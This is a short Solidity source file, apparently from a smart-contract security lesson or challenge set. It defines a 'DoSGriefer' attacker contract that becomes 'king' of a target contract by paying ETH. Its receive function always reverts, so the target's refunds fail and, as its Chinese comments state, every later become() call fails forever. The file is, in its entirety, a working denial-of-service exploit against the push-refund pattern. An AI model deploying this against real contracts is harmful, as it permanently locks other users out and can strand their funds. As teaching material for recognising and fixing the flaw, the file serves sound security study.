// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDoS {
    function become() external payable;
}

/// @title DoSGriefer - 成为 king 后拒绝再接收 ETH，永久卡死合约
contract DoSGriefer {
    IDoS public target;

    constructor(address _t) {
        target = IDoS(_t);
    }

    function attack() external payable {
        target.become{value: msg.value}();
    }

    // ❌ 任何 ETH 退款都被 revert，下一个 become() 永远失败
    receive() external payable {
        revert("DoS: cannot accept ETH");
    }
}
